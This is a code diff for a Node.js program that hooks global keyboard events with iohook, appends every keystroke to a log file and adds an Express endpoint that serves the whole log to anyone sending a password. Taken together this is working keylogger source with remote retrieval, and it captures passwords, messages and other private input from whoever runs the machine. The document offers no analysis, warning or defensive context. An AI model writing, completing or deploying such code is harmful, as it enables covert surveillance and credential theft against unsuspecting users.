@@ -1,10 +1,33 @@
 const iohook = require('iohook');
-const config = require('./config')
+const express = require('express');
+const config = require('./config');
+const fs = require('fs');
+
+const app = express();
 
 const keymap = config.keymap;
 const specialchar = {"`":"~","1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","-":"_","=":"+","[":"{","]":"}","\\":"|",";":":","'":'"',",":"<",".":">","/":"?",}
+fs.appendFile(config.dir + '/data.log', '\n', function (err) {
+    if (err) throw err;
+  });
 
 let toggle = false;
+
+app.use(express.json());
+
+app.post('/', function(req,res) {
+    if(req.body.password == config.password) {
+        fs.readFile(config.dir + '/data.log', (err,data) => {
+            if(err) {
+                return res.status(400).send({ message: err.toString() })
+            };
+            return res.status(200).send({ message: data.toString() });
+        })
+    }
+    else {
+        return res.status(401).send({ message: 'Failed to authenticate password' })
+    }
+})
 
 function interpret(event) {
 
@@ -35,7 +58,9 @@ function interpret(event) {
                 if (i.length > 1) {
                     i = (`#[ ${i} ]#`);
                 }
-                console.log(i);
+                fs.appendFile(config.dir + '/data.log', i, function (err) {
+                    if (err) throw err;
+                  });
                 //$$$$$$$$$$$$$$$$$$ variable 'i' is to be stored in a file without linebreak $$$$$$$$$$$$$$$$$$$$$$
             }
         }
@@ -45,3 +70,6 @@ function interpret(event) {
 iohook.on('keydown',interpret);
 
 iohook.start();
+
+const port = process.env.PORT || 4000;
+app.listen(port, () => console.log(`Listening to port ${port}...`));
